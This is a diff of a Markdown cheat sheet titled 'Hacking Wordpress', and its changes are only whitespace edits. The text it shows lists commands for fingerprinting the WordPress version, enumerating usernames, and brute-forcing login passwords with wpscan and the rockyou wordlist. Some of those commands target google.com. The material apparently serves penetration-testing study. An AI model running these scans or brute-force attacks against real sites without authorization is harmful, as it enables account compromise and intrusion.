@@ -25,8 +25,9 @@ excerpt: "Hacking Wordpress..."
 - Malware Distribution via Blockchain: 
 
 # Manually Hacking
+
 ### Version
->
+
 ```bash
 # Manually check source code
 Press ----> Ctrl + f (Search wordpress)
@@ -36,7 +37,7 @@ curl -s http://example.com/ | grep 'WordPress'     # http
 curl -s https://example.com/ | grep 'WordPress'    # https
 ```
 ### Username
->
+
 ```bash
 # Sitemap
       /wp-sitemap-users-1.xml
@@ -61,19 +62,20 @@ curl -s https://example.com/ | grep 'WordPress'    # https
 
 
 # Automation Hacking 
+
 ### Version 
->
+
 ```bash
 wpscan --url http://example.com   --api-token YOUR_API_TOKEN   
 ```
 
 ### Username
->
+
 ```bash
 wpscan --url http://target.com --enumerate u   --api-token YOUR_API_TOKEN 
 ```
 # Login Page Username and Password Brute force
->
+
 ```bash
 # Enumerate users and Brute passwords
 wpscan --url https://google.com/ -e u -P /usr/share/wordlists/rockyou.txt
@@ -83,7 +85,7 @@ wpscan --url https://google.com -U admin -P /usr/share/wordlists/rockyou.txt --t
 ```
 
 ## Overall 
->
+
 ```bash
 wpscan --url https://example.com/ -e ap,vt,vp,tt,cb,dbe,u,m --api-token <token>  --format json --output scan.json
 
